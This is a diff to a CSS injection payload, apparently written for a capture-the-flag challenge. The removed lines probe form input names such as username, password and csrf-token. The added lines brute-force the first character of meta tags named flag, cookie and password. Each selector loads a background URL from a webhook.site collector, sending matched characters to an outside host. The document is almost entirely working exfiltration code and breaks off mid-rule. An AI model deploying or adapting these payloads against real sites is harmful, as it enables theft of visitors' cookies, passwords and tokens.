@@ -1,83 +1,112 @@
-/* Check input name prefixes in the form */
-form:has(input[name^="u"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_u") !important;
+/* Check presence of meta tags by name */
+meta[name="flag"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_flag_present");
 }
-form:has(input[name^="us"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_us") !important;
+meta[name="cookie"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_cookie_present");
 }
-form:has(input[name^="use"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_use") !important;
-}
-form:has(input[name^="user"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_user") !important;
-}
-form:has(input[name^="usern"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_usern") !important;
-}
-form:has(input[name^="userna"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_userna") !important;
-}
-form:has(input[name^="usernam"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_usernam") !important;
-}
-form:has(input[name^="username"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_username") !important;
+meta[name="password"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_password_present");
 }
 
-/* Repeat for password */
-form:has(input[name^="p"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_p") !important;
+/* Brute force first character of content attribute for meta[name=flag] */
+meta[name="flag"][content^="a"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_a");
 }
-form:has(input[name^="pa"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_pa") !important;
+meta[name="flag"][content^="b"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_b");
 }
-form:has(input[name^="pas"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_pas") !important;
+meta[name="flag"][content^="c"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_c");
 }
-form:has(input[name^="pass"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_pass") !important;
-}
-form:has(input[name^="passw"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_passw") !important;
-}
-form:has(input[name^="passwo"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_passwo") !important;
-}
-form:has(input[name^="passwor"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_passwor") !important;
-}
-form:has(input[name^="password"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_password") !important;
-}
+/* Repeat for all letters and digits */
+meta[name="flag"][content^="d"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_d"); }
+meta[name="flag"][content^="e"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_e"); }
+meta[name="flag"][content^="f"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_f"); }
+meta[name="flag"][content^="g"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_g"); }
+meta[name="flag"][content^="h"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_h"); }
+meta[name="flag"][content^="i"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_i"); }
+meta[name="flag"][content^="j"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_j"); }
+meta[name="flag"][content^="k"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_k"); }
+meta[name="flag"][content^="l"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_l"); }
+meta[name="flag"][content^="m"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_m"); }
+meta[name="flag"][content^="n"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_n"); }
+meta[name="flag"][content^="o"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_o"); }
+meta[name="flag"][content^="p"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_p"); }
+meta[name="flag"][content^="q"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_q"); }
+meta[name="flag"][content^="r"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_r"); }
+meta[name="flag"][content^="s"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_s"); }
+meta[name="flag"][content^="t"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_t"); }
+meta[name="flag"][content^="u"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_u"); }
+meta[name="flag"][content^="v"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_v"); }
+meta[name="flag"][content^="w"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_w"); }
+meta[name="flag"][content^="x"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_x"); }
+meta[name="flag"][content^="y"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_y"); }
+meta[name="flag"][content^="z"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_z"); }
+meta[name="flag"][content^="0"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_0"); }
+meta[name="flag"][content^="1"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_1"); }
+meta[name="flag"][content^="2"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_2"); }
+meta[name="flag"][content^="3"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_3"); }
+meta[name="flag"][content^="4"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_4"); }
+meta[name="flag"][content^="5"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_5"); }
+meta[name="flag"][content^="6"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_6"); }
+meta[name="flag"][content^="7"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_7"); }
+meta[name="flag"][content^="8"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_8"); }
+meta[name="flag"][content^="9"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_start_9"); }
 
-/* Check csrf token as well */
-form:has(input[name^="c"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_c") !important;
+/* Same brute forcing for meta[name=cookie] */
+meta[name="cookie"][content^="a"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_a");
 }
-form:has(input[name^="cs"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_cs") !important;
+/* Repeat for all letters and digits */
+meta[name="cookie"][content^="b"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_b"); }
+meta[name="cookie"][content^="c"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_c"); }
+meta[name="cookie"][content^="d"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_d"); }
+meta[name="cookie"][content^="e"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_e"); }
+meta[name="cookie"][content^="f"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_f"); }
+meta[name="cookie"][content^="g"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_g"); }
+meta[name="cookie"][content^="h"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_h"); }
+meta[name="cookie"][content^="i"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_i"); }
+meta[name="cookie"][content^="j"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_j"); }
+meta[name="cookie"][content^="k"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_k"); }
+meta[name="cookie"][content^="l"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_l"); }
+meta[name="cookie"][content^="m"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_m"); }
+meta[name="cookie"][content^="n"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_n"); }
+meta[name="cookie"][content^="o"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_o"); }
+meta[name="cookie"][content^="p"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_p"); }
+meta[name="cookie"][content^="q"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_q"); }
+meta[name="cookie"][content^="r"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_r"); }
+meta[name="cookie"][content^="s"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_s"); }
+meta[name="cookie"][content^="t"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_t"); }
+meta[name="cookie"][content^="u"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_u"); }
+meta[name="cookie"][content^="v"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_v"); }
+meta[name="cookie"][content^="w"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_w"); }
+meta[name="cookie"][content^="x"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_x"); }
+meta[name="cookie"][content^="y"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_y"); }
+meta[name="cookie"][content^="z"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_z"); }
+meta[name="cookie"][content^="0"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_0"); }
+meta[name="cookie"][content^="1"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_1"); }
+meta[name="cookie"][content^="2"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_2"); }
+meta[name="cookie"][content^="3"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_3"); }
+meta[name="cookie"][content^="4"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_4"); }
+meta[name="cookie"][content^="5"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_5"); }
+meta[name="cookie"][content^="6"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_6"); }
+meta[name="cookie"][content^="7"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_7"); }
+meta[name="cookie"][content^="8"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_8"); }
+meta[name="cookie"][content^="9"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_start_9"); }
+
+/* Same brute forcing for meta[name=password] */
+meta[name="password"][content^="a"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?password_start_a");
 }
-form:has(input[name^="csr"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csr") !important;
+meta[name="password"][content^="b"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?password_start_b");
 }
-form:has(input[name^="csrf"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csrf") !important;
+meta[name="password"][content^="c"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?password_start_c");
 }
-form:has(input[name^="csrf-"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csrf-") !important;
+/* ... repeat for letters and digits ... */
+meta[name="password"][content^="0"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?password_start_0");
 }
-form:has(input[name^="csrf-t"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csrf-t") !important;
-}
-form:has(input[name^="csrf-to"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csrf-to") !important;
-}
-form:has(input[name^="csrf-tok"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csrf-tok") !important;
-}
-form:has(input[name^="csrf-toke"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csrf-toke") !important;
-}
-form:has(input[name^="csrf-token"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?name_starts_csrf-token") !important;
-}
+meta[name="password"][
